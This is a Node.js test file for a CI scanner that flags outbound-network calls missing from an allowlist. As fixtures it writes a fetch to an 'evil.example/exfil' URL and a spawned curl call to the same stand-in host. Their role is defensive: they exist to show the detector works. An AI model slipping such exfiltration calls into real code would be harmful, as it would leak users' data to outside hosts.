'use strict';
// Plan 33.5-04 — outbound-network ACTIVE-egress CI gate (SC#5, D-06).
//
// Proves scripts/scan-outbound-network.cjs:
//   (1) exits 0 over the REAL shipped tree — every real active-egress site
//       (figma-extract receiver node:http, transports/ws.cjs node:http +
//       WebSocketServer, issue-reporter spawn('gh')) is under a glob in
//       33.5-02's scripts/security/outbound-allowlist.json;
//   (2) FLAGS an un-allowlisted `fetch('https://evil.example')` fixture
//       (a NEW un-approved egress -> finding + non-zero exit);
//   (3) does NOT false-positive on a commented-out call (comment-only lines
//       are skipped, mirroring the injection scanner's fence/comment handling).
//
// Hermetic (D-10): pure fs scan, NO network. Runs in the default `npm test`.

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

const scanner = require('../../scripts/scan-outbound-network.cjs');

test('33.5-04: real shipped tree passes the gate', () => {
  // scanOutbound() over the real repo: every active-egress site is allowlisted.
  const { findings, filesScanned } = scanner.scanOutbound();
  assert.ok(filesScanned > 0, 'the scanner walked the shipped tree');
  assert.deepEqual(
    findings,
    [],
    `real tree must have zero un-allowlisted egress findings; got:\n${findings
      .map((f) => `  ${f.file}:${f.line}: ${f.pattern}: ${f.excerpt}`)
      .join('\n')}`,
  );
});

test('33.5-04: an un-allowlisted egress is flagged', () => {
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'hone-outbound-'));
  const evil = path.join(tmpDir, 'evil.cjs');
  try {
    fs.writeFileSync(evil, "const r = await fetch('https://evil.example/exfil');\n", 'utf8');
    // The tmp fixture is OUTSIDE the allowlist globs -> must be a finding.
    const { findings } = scanner.scanOutbound({ extraFiles: [evil] });
    const hit = findings.find((f) => f.file === evil || f.file.endsWith('evil.cjs'));
    assert.ok(hit, 'an un-allowlisted active fetch() must be reported as a finding');
    assert.match(hit.pattern, /fetch/i, 'the finding is attributed to the fetch( pattern');
  } finally {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }
});

test('33.5-04: a commented-out call is not a false-positive', () => {
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'hone-outbound-'));
  const commented = path.join(tmpDir, 'commented.cjs');
  try {
    fs.writeFileSync(
      commented,
      "'use strict';\n// fetch('https://example.com') — documented, not a call\n/* axios('https://x') */\nmodule.exports = {};\n",
      'utf8',
    );
    const { findings } = scanner.scanOutbound({ extraFiles: [commented] });
    const hit = findings.find((f) => f.file === commented || f.file.endsWith('commented.cjs'));
    assert.equal(hit, undefined, 'a commented-out fetch()/axios() must NOT be a finding');
  } finally {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }
});

test('33.5-04: scanOutbound exposes findings shape + exit-code contract', () => {
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'hone-outbound-'));
  const evil = path.join(tmpDir, 'spawn-evil.cjs');
  try {
    fs.writeFileSync(evil, "spawnSync('curl', ['https://evil.example']);\n", 'utf8');
    const res = scanner.scanOutbound({ extraFiles: [evil] });
    assert.ok(Array.isArray(res.findings), 'findings is an array');
    const hit = res.findings.find((f) => f.file.endsWith('spawn-evil.cjs'));
    assert.ok(hit, 'spawn of curl is active egress and is flagged when un-allowlisted');
    assert.ok(typeof hit.line === 'number' && typeof hit.excerpt === 'string', 'finding has line + excerpt');
  } finally {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }
});
